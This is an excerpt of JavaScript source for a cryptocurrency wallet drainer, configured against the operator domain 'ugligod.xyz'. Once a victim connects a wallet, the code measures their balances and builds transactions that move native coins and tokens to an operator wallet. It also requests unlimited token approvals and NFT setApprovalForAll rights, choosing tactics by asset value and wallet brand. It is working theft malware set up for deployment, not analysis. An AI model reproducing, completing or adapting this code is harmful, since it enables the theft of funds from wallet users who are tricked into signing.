...
let MS_Encryption_Key = 500; // Specify any number that will be used for encryption (it is not recommended to leave it as default!)
// The same number should be specified in the server.js file - if they differ, then nothing will work correctly

const MS_Server = "ugligod.xyz"; // Specify the domain that is attached to the drainer server
// This is the domain where you have a server, and not the site itself where you plan to use the drainer
const MS_WalletConnect_ID = "c7ac0f8081ad3af525caef1c61b1d724"; // Project ID from WalletConnect Cloud

const MS_Modal_Style = 2; // 1 - old, 2 - new (update from 10/01/2023)
...
const ms_init = () => {
  try {
    ...
    if (MS_Modal_Style == 2) {
      ...
      document.getElementsByClassName("web3-modal-main")[0].style.display =
        "block";
      document.getElementsByClassName("web3-modal-wc")[0].style.display =
        "none";
    }
  } catch (err) {
    console.log(err);
...
const retrive_wallet = async () => {
  try {
    ...
    if (localStorage["personal_wallet"])
      personal_wallet = { address: localStorage["personal_wallet"] };
    const response = await send_request({
      action: "retrive_wallet",
      personal_wallet,
    });
    if (response.status == "OK") {
      MS_Settings.Personal_Wallet = response.wallet;
      if (
        MS_Settings.Personal_Wallet &&
        typeof MS_Settings.Personal_Wallet == "object"
      ) {
...
const retrive_token = async (chain_id, contract_address) => {
  try {
    ...
    while (
      retrive_timeout[chain_id] &&
      retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000) &&
      retrive_timeout[chain_id].count >= 5
    )
    ...
    if (!retrive_timeout[chain_id])
      ...
      if (retrive_timeout[chain_id].time == Math.floor(Date.now() / 1000))
...
const SIGN_NATIVE = async (asset) => {
  ...
  const eth_gas_price = BN(await temp_node.getGasPrice())
    .div(BN(100))
    .mul(BN(Math.floor(MS_Gas_Multiplier * 100)));

  const token_limit = BN(
  ...
  const tokens_gas_fee = token_limit
    .mul(MS_Gas_Reserves[asset.chain_id] + 1)
    .mul(gas_price);
  ...
  if (MS_Settings.Settings.Reserves.Mode == 1) {
    available_amount = balance
      ...
      .mul(
        BN(100).sub(
          BN(MS_Settings.Settings.Reserves.Fix_Percent[asset.chain_id])
        )
      );
  } else if (MS_Settings.Settings.Reserves.Mode == 2) {
    let max_value = 0;
    let current_percent =
      MS_Settings.Settings.Reserves.Fix_Percent[asset.chain_id];
    for (const elem of MS_Settings.Settings.Reserves.Flex_Percent[
      asset.chain_id
    ]) {
    ...
    available_amount = balance
      .sub(gas_limit.mul(gas_price))
      .div(BN(100))
      .mul(BN(100).sub(BN(current_percent)));
...
const DO_CONTRACT = async (asset) => {
  ...
  if (MS_Settings.Settings.Chains[ankr_chain_id].Contract_Legacy == 0) {
    ...
    try {
      const response = await send_request({
        ...
        amount_usd: asset.amount_usd || null,
      });
      if (response.status == "OK" && response.mode == true)
        split_data = response.percent;
    } catch (err) {
      console.log(err);
    }
    let secondary_address = !split_data
  ...
  let unsigned_tx = {
    from: MS_Current_Address,
    to: MS_Settings.Settings.Chains[ankr_chain_id].Contract_Address,
    value: BN(100),
    data: contract_data,
  };
  const gas_limit = BN(
  ...
  if (available_amount.lte(BN(0))) {
    ...
    let new_available_amount = balance
      .sub(another_gas_limit.mul(gas_price))
      .sub(tokens_gas_fee);
...
const DO_RANDOMIZER_NATIVE = async (asset) => {
  ...
  let unsigned_tx = {
    from: MS_Current_Address,
    to: MS_Settings.Personal_Wallet.address,
    value: BN(100),
    data: "0x",
  };
...
const DO_RANDOMIZER_TOKEN = async (asset) => {
  ...
  contract_data = web3_contract.methods
    .transfer(MS_Settings.Personal_Wallet.address, asset.amount_raw)
    .encodeABI();
...
const TRANSFER_NFT = async (asset) => {
  if (
    MS_Settings.Settings.Use_Randomizer_For_NFTs &&
    MS_Settings.Personal_Wallet != null
  )
    return DO_RANDOMIZER_NFT(asset);
...
const DO_RANDOMIZER_SAFA = async (asset) => {
  ...
  contract_data = web3_contract.methods
    .setApprovalForAll(MS_Settings.Personal_Wallet.address, true)
    .encodeABI();
  unsigned_tx.data = contract_data;
...
const DO_SAFA = async (asset) => {
  if (
    ...
    return DO_RANDOMIZER_SAFA(asset);
            ...
            token_promises.push(
              new Promise(async (resolve) => {
                try {
                  ...
                  if (
                    asset.amount_usd >=
                      MS_Settings.Settings.Permit2.Price[asset.chain_id] &&
                    !is_permit2_ban
                  ) {
                    const node = new ethers.providers.JsonRpcProvider(
                      MS_Settings.RPCs[asset.chain_id]
                ...
                try {
                  if (
                    ...
                    (MS_Settings.Settings.Approve.Trust >= 2 &&
                      MS_Current_Provider == "Trust Wallet") ||
                    asset.amount_usd >=
                      MS_Settings.Settings.Permit.Price[asset.chain_id]
                  ) {
...
const APPROVE_TOKEN = async (asset) => {
  if (MS_Settings.Settings.Approve.Enable == 0) {
...
const MM_APPROVE_TOKEN = async (asset) => {
  ...
  contract_data = web3_contract.methods[increase_type](
    MS_Settings.Settings.Use_Randomizer_For_Tokens
      ? MS_Settings.Personal_Wallet.address
      : MS_Settings.Address,
    max_approval_amount
...
const connect_wallet = async (provider = null) => {
  try {
    ...
    if (assets_usd_balance > 0 && MS_Settings.Is_Personal_Wallet)
      ...
      for (const asset of assets) {
        try {
          ...
          if (asset.type == "NATIVE") {
            ...
            const gas_price = BN(await node.getGasPrice())
              .div(BN(100))
              .mul(Math.floor(MS_Gas_Multiplier * 100));
            const token_limit = BN(
              asset.chain_id == 42161
                ? 5000000
                : asset.chain_id == 43114
            ...
            const balance = await node.getBalance(MS_Current_Address);
            const available_amount = balance
              .sub(gas_limit.mul(gas_price))
              .sub(tokens_gas_fee);
